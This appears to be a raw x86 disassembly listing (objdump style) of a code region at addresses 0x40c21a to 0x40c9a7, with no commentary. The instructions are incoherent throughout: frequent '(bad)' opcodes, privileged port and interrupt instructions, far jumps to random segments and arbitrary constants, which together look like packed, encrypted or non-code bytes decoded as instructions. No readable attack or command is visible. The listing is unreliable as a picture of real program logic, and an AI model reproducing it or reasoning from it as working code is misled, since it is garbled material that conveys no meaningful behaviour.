  40c21a:	mul    DWORD PTR [ebx]
  40c21c:	pop    esi
  40c21d:	mov    dl,0x77
  40c21f:	add    BYTE PTR [edx-0x66318ee8],dl
  40c225:	inc    edi
  40c226:	or     al,0xcf
  40c228:	or     dh,al
  40c22a:	cs loopne 0x40c275
  40c22d:	ret    
  40c22e:	jns    0x40c229
  40c230:	sbb    eax,DWORD PTR [edi+0x40785095]
  40c236:	gs test al,0x18
  40c239:	in     al,0x3c
  40c23b:	fmul   QWORD PTR [ecx+0xe]
  40c23e:	gs adc eax,0x65da7b3c
  40c244:	inc    esi
  40c245:	cli    
  40c246:	int    0x15
  40c248:	les    esi,FWORD PTR [ecx]
  40c24a:	sbb    al,0x31
  40c24c:	lds    eax,FWORD PTR [ebp+0x53]
  40c24f:	cmp    al,0x8
  40c251:	mov    esi,0xde894247
  40c256:	(bad)  
  40c257:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c258:	mov    dh,0x40
  40c25a:	jmp    0x302c:0xd6e7a601
  40c261:	mov    edx,0xa6533d28
  40c266:	or     al,BYTE PTR [edi]
  40c268:	mov    ch,0x58
  40c26a:	daa    
  40c26b:	fld    DWORD PTR [bp+si+0x2257]
  40c270:	add    BYTE PTR ds:0xc32a74e7,ah
  40c276:	lds    edx,FWORD PTR [esi-0x68]
  40c279:	xchg   edx,eax
  40c27a:	mov    bl,0xf4
  40c27c:	das    
  40c27d:	inc    esp
  40c27e:	inc    DWORD PTR [eax]
  40c280:	cdq    
  40c281:	pop    ecx
  40c282:	(bad)  
  40c283:	xor    esi,ebx
  40c285:	addr16 mov eax,0x114c98a1
  40c28b:	outs   dx,BYTE PTR ds:[esi]
  40c28c:	lds    edi,FWORD PTR [edi+0x724c53fa]
  40c292:	push   es
  40c293:	ror    ch,0x8f
  40c296:	xchg   esp,edx
  40c298:	shr    BYTE PTR [ebp+0x21efe955],cl
  40c29e:	dec    esi
  40c29f:	mov    ds:0x21e0cab4,eax
  40c2a4:	sbb    al,0xd
  40c2a6:	sbb    BYTE PTR [ebx],dh
  40c2a8:	mov    ch,BYTE PTR [ebp+0x6cda2899]
  40c2ae:	sahf   
  40c2af:	mov    eax,ds:0x884a6edb
  40c2b4:	sub    al,0x29
  40c2b6:	mov    edx,0x86c0b821
  40c2bb:	mov    ebx,0xea765da3
  40c2c0:	jp     0x40c341
  40c2c2:	in     al,0x7a
  40c2c4:	sbb    ah,dl
  40c2c6:	imul   edi,DWORD PTR [eax+ebp*8+0x2423c8c4],0x2
  40c2ce:	jo     0x40c2bc
  40c2d0:	xlat   BYTE PTR ds:[ebx]
  40c2d1:	jns    0x40c2a4
  40c2d3:	sub    al,0xec
  40c2d5:	lock mov ebp,0x4dfecd4c
  40c2db:	stos   DWORD PTR es:[edi],eax
  40c2dc:	iret   
  40c2dd:	dec    ecx
  40c2de:	in     al,dx
  40c2df:	mov    cl,0xfc
  40c2e1:	push   ebx
  40c2e2:	int    0xf6
  40c2e4:	(bad)  
  40c2e6:	mov    WORD PTR ds:0x640bd96e,fs
  40c2ec:	mov    esi,0x13e55cb
  40c2f1:	cmp    ch,bh
  40c2f3:	imul   ah
  40c2f5:	cmp    DWORD PTR [edi+0x644f4691],0xffffff9c
  40c2fc:	out    0x92,eax
  40c2fe:	xchg   BYTE PTR [esi-0x2d3cb6e0],ch
  40c304:	adc    al,0x9b
  40c306:	daa    
  40c307:	sbb    eax,0xf322efbf
  40c30c:	mov    bl,0x4c
  40c30e:	cli    
  40c30f:	xor    dl,BYTE PTR [eax-0x37]
  40c312:	xor    ebp,DWORD PTR [esi+eiz*2-0x5c4ca0f]
  40c319:	sub    al,0xc0
  40c31b:	xchg   DWORD PTR [esi+0x20e0de38],eax
  40c321:	sbb    BYTE PTR [ecx+0x23c47dd],cl
  40c327:	or     ebp,DWORD PTR [ebx+0x11]
  40c32a:	or     eax,DWORD PTR es:[edx-0x61593210]
  40c331:	out    dx,al
  40c332:	ficom  WORD PTR ds:0xba02b192
  40c338:	push   0xfffffffb
  40c33a:	cs popf 
  40c33c:	shr    edi,0x9c
  40c33f:	(bad)  
  40c340:	pushf  
  40c341:	arpl   dx,sp
  40c343:	push   edi
  40c344:	or     al,0x41
  40c346:	and    BYTE PTR [eax],al
  40c348:	pop    edx
  40c349:	pop    eax
  40c34a:	pushf  
  40c34b:	ja     0x40c2d7
  40c34d:	xchg   edi,eax
  40c34e:	xchg   DWORD PTR [ecx+ebp*8-0x37],ebp
  40c352:	clc    
  40c353:	fstp   QWORD PTR [edx+0x20]
  40c356:	mov    dl,0xcc
  40c358:	xchg   ebx,eax
  40c359:	adc    DWORD PTR [eax+0x347e7e0e],esi
  40c35f:	dec    edx
  40c360:	push   es
  40c361:	sbb    bh,BYTE PTR [edi]
  40c363:	cs xchg ecx,eax
  40c365:	aaa    
  40c366:	cmc    
  40c367:	jp     0x40c3be
  40c369:	aas    
  40c36a:	cmp    cl,BYTE PTR [edx-0x108586d4]
  40c370:	jns    0x40c3a3
  40c372:	lods   al,BYTE PTR ds:[esi]
  40c373:	or     bl,0x81
  40c376:	lea    ecx,[edi-0x20aa9cae]
  40c37c:	xor    ebx,ebp
  40c37e:	imul   esp,DWORD PTR [edx],0xbc36dc5a
  40c384:	aam    0x8d
  40c386:	mov    BYTE PTR ds:0x24421acf,0x1f
  40c38d:	xlat   BYTE PTR ds:[ebx]
  40c38e:	mov    al,ds:0x771d7d14
  40c393:	push   ebp
  40c394:	fcomp  DWORD PTR [edi+0x18137468]
  40c39a:	mov    bl,0x35
  40c39c:	out    0xd5,al
  40c39e:	or     DWORD PTR [edi+ebx*8+0x6f],ecx
  40c3a2:	mov    dh,0x65
  40c3a4:	repz gs ret 0xcd14
  40c3a9:	jo     0x40c370
  40c3ab:	mov    ds:0x69a77354,eax
  40c3b0:	cmp    eax,0x566fbdc5
  40c3b5:	inc    esp
  40c3b6:	dec    ecx
  40c3b7:	push   eax
  40c3b8:	loop   0x40c3ee
  40c3ba:	test   DWORD PTR [esi-0x11],0xdcfcb58b
  40c3c1:	nop
  40c3c2:	int    0x67
  40c3c4:	or     esi,DWORD PTR [ecx+0x5868d9c6]
  40c3ca:	dec    esi
  40c3cb:	jae    0x40c393
  40c3cd:	mov    cl,0x7c
  40c3cf:	dec    eax
  40c3d0:	popa   
  40c3d1:	out    dx,al
  40c3d2:	pop    ds
  40c3d3:	or     esi,DWORD PTR [eax+0x76]
  40c3d6:	repnz mov eax,0x90a86beb
  40c3dc:	ins    DWORD PTR es:[edi],dx
  40c3dd:	sub    BYTE PTR [ebp+0x23198054],dl
  40c3e3:	fwait
  40c3e4:	inc    ebx
  40c3e5:	push   esi
  40c3e6:	cli    
  40c3e7:	add    DWORD PTR ds:0x6261d1c6,ecx
  40c3ed:	lods   al,BYTE PTR ds:[esi]
  40c3ee:	sub    ecx,ecx
  40c3f0:	shr    DWORD PTR [ebx+0x774c6a32],cl
  40c3f6:	rcl    ch,1
  40c3f8:	or     bl,0x4
  40c3fb:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3fd:	stos   DWORD PTR es:[edi],eax
  40c3fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3ff:	pop    ebp
  40c400:	dec    edi
  40c401:	(bad)  
  40c402:	cdq    
  40c403:	cmp    eax,0xcdb7e1d0
  40c408:	or     DWORD PTR [edi+ebp*8],0xc23c03b5
  40c40f:	push   0x3c
  40c411:	xor    esp,DWORD PTR [edx+0x75]
  40c414:	ss push es
  40c416:	pop    ebp
  40c417:	mov    dl,0xea
  40c419:	add    al,0xe6
  40c41b:	imul   edi,DWORD PTR [esi-0x21],0xa6f99578
  40c422:	add    edi,esp
  40c424:	mov    edi,0xc15ed6ab
  40c429:	mov    dl,0x7b
  40c42b:	inc    esi
  40c42c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c42d:	dec    esi
  40c42e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c42f:	jno    0x40c498
  40c431:	pop    ebx
  40c432:	xor    edi,esp
  40c434:	or     al,0x6c
  40c436:	sub    ecx,DWORD PTR [ecx-0x47]
  40c439:	pusha  
  40c43a:	sbb    edx,ecx
  40c43c:	sub    ch,BYTE PTR [edi]
  40c43e:	sahf   
  40c43f:	mov    ds:0x9b474bbc,eax
  40c444:	or     BYTE PTR [edx+0x33],ch
  40c447:	or     edx,DWORD PTR [eax-0xf]
  40c44a:	cmp    bh,BYTE PTR [esi]
  40c44c:	or     eax,0xbb897311
  40c451:	xor    ecx,DWORD PTR [esi+ebp*1+0x4e]
  40c455:	mov    ebx,0xcc417094
  40c45a:	lock repnz (bad) 
  40c45d:	loop   0x40c4bc
  40c45f:	and    DWORD PTR [esi-0x7f],0xffffff9a
  40c463:	aas    
  40c464:	push   ecx
  40c465:	call   0xe16d:0x1e554f54
  40c46c:	outs   dx,DWORD PTR ds:[esi]
  40c46d:	xor    eax,DWORD PTR fs:[edx]
  40c470:	xchg   ebx,eax
  40c471:	sub    dh,BYTE PTR [eax+0x42]
  40c474:	jo     0x40c4b7
  40c476:	or     ebp,ebp
  40c478:	les    esp,FWORD PTR [edi-0x5c]
  40c47b:	shl    cl,cl
  40c47d:	adc    bl,BYTE PTR [eax+0x79]
  40c480:	popa   
  40c481:	or     dh,dl
  40c483:	jge    0x40c504
  40c485:	dec    edi
  40c486:	mov    eax,0xff4fb5ab
  40c48b:	mov    WORD PTR [ebp+0x26fe7170],ds
  40c491:	inc    esp
  40c492:	add    eax,0x45bcb145
  40c497:	mov    bh,dh
  40c499:	pop    ecx
  40c49a:	fsubr  QWORD PTR [eax+esi*1]
  40c49d:	cli    
  40c49e:	cli    
  40c49f:	cmc    
  40c4a0:	ss test eax,0xa6a12f05
  40c4a6:	bound  esi,QWORD PTR [esi+0x35f69dca]
  40c4ac:	dec    esp
  40c4ad:	test   BYTE PTR [ebx],ch
  40c4af:	inc    esp
  40c4b0:	dec    ebp
  40c4b1:	aaa    
  40c4b2:	mov    esi,0x4d671d6e
  40c4b7:	mov    ebx,0x41482883
  40c4bc:	ins    BYTE PTR es:[edi],dx
  40c4bd:	cmp    al,0x76
  40c4bf:	in     al,0xd3
  40c4c1:	bnd call 0x151e375d
  40c4c7:	pushf  
  40c4c8:	scas   al,BYTE PTR es:[edi]
  40c4c9:	push   edi
  40c4ca:	data16 jg 0x40c503
  40c4cd:	jae    0x40c4cc
  40c4cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4d0:	jmp    0x39bb:0x2538dcd
  40c4d7:	cmp    dh,BYTE PTR es:[ebx+eax*2-0x23]
  40c4dc:	mov    esi,ecx
  40c4de:	mov    ecx,0x8323e301
  40c4e3:	inc    eax
  40c4e4:	in     al,dx
  40c4e5:	leave  
  40c4e6:	jle    0x40c4d7
  40c4e8:	pop    ecx
  40c4e9:	sar    BYTE PTR [ebx],cl
  40c4eb:	dec    esp
  40c4ec:	ret    
  40c4ed:	shr    BYTE PTR [ebp+0x3bd1fd2f],0x63
  40c4f4:	ins    BYTE PTR es:[edi],dx
  40c4f5:	dec    esi
  40c4f6:	fimul  WORD PTR [ebx-0x56]
  40c4f9:	mov    ebx,0x208c7757
  40c4fe:	adc    edi,ebx
  40c500:	cmp    esi,DWORD PTR [esp+ebx*4+0x741d5969]
  40c507:	fwait
  40c508:	push   0x1
  40c50a:	dec    eax
  40c50b:	lods   ax,WORD PTR ds:[esi]
  40c50d:	cmp    bh,BYTE PTR [eax+0x117703e8]
  40c513:	or     al,0x63
  40c515:	ret    
  40c516:	repz retf 
  40c518:	adc    DWORD PTR [ebp+ebx*8+0x741b005c],esi
  40c51f:	jae    0x40c4e5
  40c521:	and    dh,BYTE PTR [ecx]
  40c523:	pop    edx
  40c524:	mov    esp,DWORD PTR [ebx]
  40c526:	push   0xffffffb9
  40c528:	pop    ss
  40c529:	sub    al,0xc3
  40c52b:	test   BYTE PTR [esi],ah
  40c52d:	jecxz  0x40c570
  40c52f:	xchg   edx,eax
  40c530:	push   esi
  40c531:	mov    esi,0xaa7e839a
  40c536:	mov    ebp,0x2f32b0f0
  40c53b:	into   
  40c53c:	ins    BYTE PTR es:[edi],dx
  40c53d:	das    
  40c53e:	fisttp DWORD PTR [esi]
  40c540:	and    DWORD PTR [ecx+0x6d],edx
  40c543:	mov    WORD PTR [edi+edx*4],ss
  40c546:	iret   
  40c547:	hlt    
  40c548:	loop   0x40c51e
  40c54a:	inc    edx
  40c54b:	aas    
  40c54c:	leave  
  40c54d:	fwait
  40c54e:	and    eax,0xfa4cb311
  40c553:	dec    edx
  40c554:	jae    0x40c4ed
  40c556:	mov    al,0xcd
  40c558:	xchg   esi,eax
  40c559:	loope  0x40c555
  40c55b:	lea    edi,[edx-0x30f3fddc]
  40c561:	and    ecx,DWORD PTR [eax-0x7f167ef9]
  40c567:	sbb    eax,0x22991e61
  40c56c:	mov    edi,0x2934df0d
  40c571:	dec    ebx
  40c572:	cmp    eax,0x81492177
  40c577:	adc    BYTE PTR [esp+eiz*8-0x2d0abb4d],ch
  40c57e:	lds    ebx,FWORD PTR [esi+0x38aea9f1]
  40c584:	inc    esp
  40c585:	sbb    DWORD PTR [eax],edx
  40c587:	arpl   WORD PTR [edi],bx
  40c589:	sub    DWORD PTR [edi-0x1e17feb8],esp
  40c58f:	outs   dx,BYTE PTR ds:[esi]
  40c590:	pop    eax
  40c591:	jecxz  0x40c5e8
  40c593:	pop    ds
  40c594:	mov    edx,0x34b2c6ba
  40c599:	xchg   ebx,eax
  40c59a:	loopne 0x40c57b
  40c59c:	out    dx,al
  40c59d:	pop    edi
  40c59e:	or     eax,0x7835c203
  40c5a3:	jae    0x40c529
  40c5a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5a6:	or     eax,0xb0a87a44
  40c5ab:	mov    bl,bh
  40c5ad:	daa    
  40c5ae:	dec    esp
  40c5af:	push   esp
  40c5b0:	stc    
  40c5b1:	xor    ch,0x24
  40c5b4:	lods   eax,DWORD PTR ds:[esi]
  40c5b5:	imul   DWORD PTR [ecx+edx*2+0x41ecd488]
  40c5bc:	call   0x39fee6f
  40c5c1:	dec    ecx
  40c5c2:	sub    eax,DWORD PTR [esi-0x3b8ebd44]
  40c5c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5c9:	icebp  
  40c5ca:	je     0x40c63b
  40c5cc:	(bad)  
  40c5cd:	lds    esp,FWORD PTR [edx+0x28cc6de7]
  40c5d3:	stc    
  40c5d4:	cmp    eax,0xcb3ac041
  40c5d9:	jle    0x40c62e
  40c5db:	mov    eax,ds:0x63314fff
  40c5e0:	inc    ah
  40c5e2:	(bad)  
  40c5e3:	mov    dl,0xe3
  40c5e5:	cmp    bh,ch
  40c5e7:	pop    esp
  40c5e8:	pop    es
  40c5e9:	sub    bl,cl
  40c5eb:	fiadd  DWORD PTR [ecx]
  40c5ed:	sub    bl,BYTE PTR [eax+0x1f]
  40c5f0:	or     BYTE PTR [edi-0x690b9636],al
  40c5f6:	stos   BYTE PTR es:[edi],al
  40c5f7:	ret    
  40c5f8:	jns    0x40c59f
  40c5fa:	ret    0x5064
  40c5fd:	icebp  
  40c5fe:	cdq    
  40c5ff:	outs   dx,BYTE PTR ds:[esi]
  40c600:	adc    eax,0x9f525e58
  40c605:	pop    ss
  40c606:	pop    ds
  40c607:	xor    al,0x5
  40c609:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c60a:	ret    
  40c60b:	pop    ebx
  40c60c:	mov    ch,0x39
  40c60e:	xlat   BYTE PTR ds:[ebx]
  40c60f:	mov    dl,0x1e
  40c611:	imul   edi,DWORD PTR [edx-0x35],0xeb87ed3
  40c618:	out    0x5e,eax
  40c61a:	sub    dl,dh
  40c61c:	sbb    ecx,esp
  40c61e:	mov    BYTE PTR [eax+0x68],dh
  40c621:	ret    0x361f
  40c624:	js     0x40c600
  40c626:	cmp    BYTE PTR [edx+0x2d1d02a9],0xb3
  40c62d:	sbb    DWORD PTR [edx+0x48],esi
  40c630:	lods   al,BYTE PTR ds:[esi]
  40c631:	cmp    ch,dl
  40c633:	sbb    al,ah
  40c635:	dec    ecx
  40c636:	jmp    0x5644:0xa890b162
  40c63d:	mov    bl,0x82
  40c63f:	push   di
  40c641:	popf   
  40c642:	sub    ebx,DWORD PTR [esi]
  40c644:	int3   
  40c645:	aad    0x18
  40c647:	inc    eax
  40c648:	loope  0x40c684
  40c64a:	adc    BYTE PTR [edx],cl
  40c64c:	cmp    BYTE PTR [ebp-0x41],cl
  40c64f:	inc    edi
  40c650:	mov    edx,0x3239cf41
  40c655:	daa    
  40c656:	fcmovnu st,st(1)
  40c658:	xlat   BYTE PTR ds:[ebx]
  40c659:	stc    
  40c65a:	or     eax,0x4e3618f4
  40c65f:	or     dl,BYTE PTR [edi]
  40c661:	adc    al,0xd4
  40c663:	jmp    0xb026:0x387fbd66
  40c66a:	sub    esi,DWORD PTR [ebp-0xbf0e8e7]
  40c670:	jle    0x40c613
  40c672:	and    ch,BYTE PTR [edx]
  40c674:	fild   DWORD PTR [esi-0x5c4007cc]
  40c67a:	bound  edi,QWORD PTR [ecx]
  40c67c:	pop    edi
  40c67d:	or     DWORD PTR [edx+0x75abed04],ebp
  40c683:	cli    
  40c684:	or     ah,al
  40c686:	sbb    DWORD PTR [ebx-0x64],eax
  40c689:	lds    edi,FWORD PTR [edi+eiz*1]
  40c68c:	in     eax,dx
  40c68d:	adc    eax,0x5f4363e6
  40c692:	(bad)  
  40c693:	adc    DWORD PTR [ebx-0x46e1cd47],ebx
  40c699:	mov    edi,0x7e00d69d
  40c69e:	lds    esp,FWORD PTR [ebx+ebp*1]
  40c6a1:	mov    ebx,0x5c31de50
  40c6a6:	cmp    eax,0xa8a82d2b
  40c6ab:	call   0xe4e5:0xc9399c62
  40c6b2:	dec    ecx
  40c6b3:	ret    0xe9f4
  40c6b6:	gs je  0x40c6c3
  40c6b9:	test   DWORD PTR [esi],esi
  40c6bb:	push   0x3a2f38cf
  40c6c0:	adc    BYTE PTR [edx-0xe0c3271],dl
  40c6c6:	adc    eax,0x9ff09e95
  40c6cb:	pop    ss
  40c6cc:	dec    edi
  40c6cd:	dec    esp
  40c6ce:	mov    cs,WORD PTR [eax+0x6c282712]
  40c6d4:	xchg   DWORD PTR [ecx],edx
  40c6d6:	ins    DWORD PTR es:[edi],dx
  40c6d7:	cmp    eax,0x65525bca
  40c6dc:	and    eax,0x74098db3
  40c6e1:	stc    
  40c6e2:	dec    esp
  40c6e3:	(bad)  
  40c6e4:	test   dl,0x64
  40c6e7:	xor    eax,0xdd9b8c51
  40c6ec:	bound  esi,QWORD PTR [eax+ebx*4-0x6543afac]
  40c6f3:	jno    0x40c766
  40c6f5:	fidiv  DWORD PTR [ecx+0x41955304]
  40c6fb:	sub    dl,BYTE PTR [ecx-0x56185699]
  40c701:	sbb    BYTE PTR [ecx+0xe],bl
  40c704:	inc    edx
  40c705:	or     BYTE PTR [ebx+eax*4],dl
  40c708:	cmp    DWORD PTR [eax+0x2c],0xaab2a202
  40c70f:	push   eax
  40c710:	sub    eax,0x249f7d2c
  40c715:	std    
  40c716:	jbe    0x40c6a2
  40c718:	jns    0x40c793
  40c71a:	sub    dl,dh
  40c71c:	mov    dh,0x4
  40c71e:	inc    ebp
  40c720:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40c722:	popa   
  40c723:	mov    ds:0xbf8d9653,eax
  40c728:	mov    eax,0x5f6bf085
  40c72d:	out    dx,al
  40c72e:	addr16 inc ecx
  40c730:	outs   dx,DWORD PTR es:[esi]
  40c732:	cld    
  40c733:	cmp    DWORD PTR [bx+si-0x585c],esp
  40c738:	xchg   ebx,eax
  40c739:	or     DWORD PTR [eax+0x5],0xfffffff2
  40c73d:	mov    edx,0x47537f7c
  40c742:	add    ecx,esp
  40c744:	clc    
  40c745:	xchg   edi,eax
  40c746:	and    cl,BYTE PTR [eax+eiz*4-0x2c]
  40c74a:	add    DWORD PTR [ebp+0x52d57160],ecx
  40c750:	inc    edi
  40c751:	cmp    esp,DWORD PTR [eax+eax*8-0xd]
  40c755:	scas   al,BYTE PTR es:[edi]
  40c756:	dec    esi
  40c757:	lock nop
  40c759:	ins    BYTE PTR es:[edi],dx
  40c75a:	adc    DWORD PTR [edx],esp
  40c75c:	sbb    BYTE PTR [esi],bl
  40c75e:	fiadd  WORD PTR ds:[eax+0x56142566]
  40c765:	shr    DWORD PTR [eax+0x26],cl
  40c768:	shl    DWORD PTR [ebx-0x31782b39],1
  40c76e:	mov    ebp,0xb76b9bf0
  40c773:	adc    DWORD PTR [ecx+ebp*8+0x593bc6d5],edx
  40c77a:	and    edx,DWORD PTR [eax-0x66baaf75]
  40c780:	xchg   ecx,eax
  40c781:	outs   dx,BYTE PTR ds:[esi]
  40c782:	call   0x119d:0xe3759327
  40c789:	imul   eax,DWORD PTR ds:0x926ea7fa,0x48
  40c790:	mov    esp,0xac6caf68
  40c795:	sar    DWORD PTR [edx+0x1a],1
  40c798:	lods   al,BYTE PTR ds:[esi]
  40c799:	fist   DWORD PTR [esi+0x46]
  40c79c:	jecxz  0x40c812
  40c79e:	inc    ecx
  40c79f:	mov    DWORD PTR [ebp+0x5198a880],ebp
  40c7a5:	mov    ch,0xc1
  40c7a7:	mov    esi,0x25d2f594
  40c7ac:	pop    eax
  40c7ad:	xchg   ebp,eax
  40c7ae:	mov    ?,WORD PTR [edx]
  40c7b0:	sbb    DWORD PTR [edx+0x23],0x109c93b
  40c7b7:	mov    ecx,DWORD PTR [ecx]
  40c7b9:	mov    al,ch
  40c7bb:	in     eax,dx
  40c7bc:	mov    esi,0x7df3299
  40c7c1:	or     edi,0x69
  40c7c4:	jl     0x40c7cb
  40c7c6:	cs iret 
  40c7c8:	cmp    bh,dh
  40c7ca:	(bad)  
  40c7cb:	aad    0x1b
  40c7cd:	sub    al,0xbb
  40c7cf:	sti    
  40c7d0:	ins    DWORD PTR es:[edi],dx
  40c7d1:	bswap  esi
  40c7d3:	call   ebx
  40c7d5:	jg     0x40c75e
  40c7d7:	xor    esi,eax
  40c7d9:	xor    BYTE PTR [ebp+0x64],ah
  40c7dc:	dec    ebp
  40c7dd:	pushf  
  40c7de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7df:	scas   al,BYTE PTR es:[edi]
  40c7e0:	sub    al,0x22
  40c7e2:	enter  0xdabf,0x44
  40c7e6:	nop
  40c7e7:	stc    
  40c7e8:	jg     0x40c7a5
  40c7ea:	sub    eax,ebp
  40c7ec:	mov    ds,WORD PTR [ebx+0x62]
  40c7ef:	inc    ebx
  40c7f0:	out    dx,al
  40c7f1:	in     al,0x2a
  40c7f3:	and    eax,0x26292524
  40c7f8:	mov    DWORD PTR [ebp+0x67],edi
  40c7fb:	or     dh,BYTE PTR [edx]
  40c7fd:	inc    ebx
  40c7fe:	adc    ah,ch
  40c800:	pop    es
  40c801:	mov    ecx,0xb26e9d20
  40c806:	ins    DWORD PTR es:[edi],dx
  40c807:	ja     0x40c795
  40c809:	sub    eax,esp
  40c80b:	mov    ah,BYTE PTR [edx+0x54]
  40c80e:	stos   BYTE PTR es:[edi],al
  40c80f:	loope  0x40c7a7
  40c811:	mov    cl,ch
  40c813:	cmp    BYTE PTR [esi],bh
  40c815:	hlt    
  40c816:	push   esi
  40c817:	pusha  
  40c818:	(bad)  
  40c819:	fistp  QWORD PTR [ebp+0x4e]
  40c81c:	jg     0x40c81f
  40c81e:	scas   eax,DWORD PTR es:[edi]
  40c81f:	int    0x8
  40c821:	ret    
  40c822:	cmp    BYTE PTR [edx],dl
  40c824:	sbb    bh,BYTE PTR [ecx]
  40c826:	mov    bh,BYTE PTR [edx+0x26]
  40c829:	(bad)  
  40c82a:	out    dx,eax
  40c82b:	(bad)  
  40c82c:	adc    al,0x57
  40c82e:	pop    ss
  40c82f:	and    al,0xf3
  40c831:	ficomp DWORD PTR [esp+edx*8-0x30]
  40c835:	mov    edi,0x7835bd62
  40c83a:	stos   DWORD PTR es:[edi],eax
  40c83b:	retf   
  40c83c:	and    al,0x4a
  40c83e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c83f:	xor    al,0x2
  40c841:	or     dl,al
  40c843:	add    eax,0x88578a78
  40c848:	cmp    edx,ebx
  40c84a:	pop    edx
  40c84b:	pop    esi
  40c84c:	jmp    0xa94b:0x5ddd94cb
  40c853:	cmp    eax,esi
  40c855:	jbe    0x40c7f2
  40c857:	jo     0x40c82e
  40c859:	(bad)  
  40c85b:	xchg   edi,eax
  40c85c:	leave  
  40c85d:	push   ss
  40c85e:	enter  0xf5ab,0xb5
  40c862:	mov    ebp,0x785df904
  40c867:	repnz out 0xfa,eax
  40c86a:	cli    
  40c86b:	jmp    0x40c7f7
  40c86d:	arpl   WORD PTR [edi+0x5],ax
  40c870:	sub    BYTE PTR [ebp+0x16d5ef95],ch
  40c876:	popf   
  40c877:	loopne 0x40c889
  40c879:	mov    esi,0x8907e08a
  40c87e:	mov    ds:0x8f988e7a,al
  40c883:	loope  0x40c86a
  40c885:	or     edi,DWORD PTR [ecx-0x1bbf8bd2]
  40c88b:	loop   0x40c83d
  40c88d:	(bad)  
  40c88e:	mov    WORD PTR [ebx],gs
  40c890:	mov    esi,0x4eca2014
  40c895:	jmp    0xf93a:0x86fe95cb
  40c89c:	scas   eax,DWORD PTR es:[edi]
  40c89d:	lds    ebp,FWORD PTR [ebp-0x22]
  40c8a0:	xchg   ebp,eax
  40c8a1:	jp     0x40c8b4
  40c8a3:	mov    ds:0xcfc306db,eax
  40c8a8:	jle    0x40c8b2
  40c8aa:	aam    0x69
  40c8ac:	push   ebx
  40c8ad:	in     eax,0xc0
  40c8af:	mov    bh,0x8e
  40c8b1:	test   DWORD PTR [ebp-0xe164645],0xf722cc4c
  40c8bb:	jmp    0x34cc:0x62dc58fc
  40c8c2:	adc    DWORD PTR [ebx-0x463b06b0],ecx
  40c8c8:	clc    
  40c8c9:	and    BYTE PTR [esi-0x16ea551d],cl
  40c8cf:	pop    ecx
  40c8d0:	pop    edi
  40c8d1:	adc    DWORD PTR [esi],0xffffffcb
  40c8d4:	ds xchg ebx,eax
  40c8d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8d7:	test   eax,0xaa09fb59
  40c8dc:	enter  0x662e,0xf6
  40c8e0:	retf   0x7b10
  40c8e3:	ja     0x40c8fd
  40c8e5:	int    0xd3
  40c8e7:	stos   BYTE PTR es:[edi],al
  40c8e8:	mov    ah,0x3
  40c8ea:	dec    ebx
  40c8eb:	outs   dx,BYTE PTR ds:[esi]
  40c8ec:	adc    eax,0xe4cc1770
  40c8f1:	sahf   
  40c8f2:	call   0xefef:0x7cd57d8b
  40c8f9:	lods   eax,DWORD PTR ds:[esi]
  40c8fa:	add    eax,0x23
  40c8fd:	mov    esi,0x7180ceb3
  40c902:	enter  0xc9f6,0x22
  40c906:	mov    ebp,0xe899b37b
  40c90b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c90c:	ins    DWORD PTR es:[edi],dx
  40c90d:	xchg   edx,eax
  40c90e:	sbb    BYTE PTR [edi+0x1b],dh
  40c911:	outs   dx,DWORD PTR ds:[esi]
  40c912:	dec    edi
  40c913:	cmp    ebx,ebp
  40c915:	ficom  WORD PTR [ebp-0x1c8be70a]
  40c91b:	mov    edi,0xefcaf95d
  40c920:	mov    ds:0xdace5155,al
  40c925:	pop    ss
  40c926:	cli    
  40c927:	mov    edi,0x5e205796
  40c92c:	into   
  40c92d:	sub    DWORD PTR [ebp+0x20ddfebf],0xbbb63d46
  40c937:	adc    esp,esp
  40c939:	es jno 0x40c976
  40c93c:	shr    al,cl
  40c93e:	sub    DWORD PTR [esi+0x45e9d2f7],edx
  40c944:	push   edi
  40c945:	dec    ecx
  40c946:	pop    ebx
  40c947:	lods   eax,DWORD PTR ds:[esi]
  40c948:	lods   al,BYTE PTR ds:[esi]
  40c949:	push   esp
  40c94a:	xchg   ebx,eax
  40c94b:	int3   
  40c94c:	jecxz  0x40c95e
  40c94e:	fstp   TBYTE PTR [edx+eax*4-0x66f35a8f]
  40c955:	push   ebx
  40c956:	push   esp
  40c957:	inc    ebx
  40c958:	stc    
  40c959:	pop    ds
  40c95a:	cmc    
  40c95b:	lods   al,BYTE PTR ds:[si]
  40c95d:	adc    ecx,esi
  40c95f:	aam    0x5f
  40c961:	shl    DWORD PTR [eax+eax*4+0x1],1
  40c965:	push   esi
  40c966:	das    
  40c967:	aad    0x7e
  40c969:	dec    ebp
  40c96a:	lea    ecx,[eax-0x22]
  40c96d:	fmul   DWORD PTR [edi-0x41da5871]
  40c973:	cmp    DWORD PTR [edx],edx
  40c975:	das    
  40c976:	stc    
  40c977:	popa   
  40c978:	dec    eax
  40c979:	jle    0x40c9f2
  40c97b:	mov    al,0x7c
  40c97d:	xor    BYTE PTR [ecx],al
  40c97f:	and    ebp,DWORD PTR [ebp-0x38fc3b67]
  40c985:	adc    bh,ah
  40c987:	mov    WORD PTR [edx],fs
  40c989:	or     esp,DWORD PTR [eax-0x35]
  40c98c:	(bad)  
  40c98d:	xor    esi,DWORD PTR [edi]
  40c98f:	add    bl,BYTE PTR [ebx-0x47]
  40c992:	arpl   WORD PTR [eax],si
  40c994:	sti    
  40c995:	mov    edx,0x5a9b4731
  40c99a:	jnp    0x40c9c5
  40c99c:	xchg   ecx,eax
  40c99d:	xor    al,0xa
  40c99f:	popa   
  40c9a0:	xor    BYTE PTR [edi],0xef
  40c9a3:	inc    ecx
  40c9a4:	sar    DWORD PTR [eax-0x4a],1
  40c9a7:	cmc    
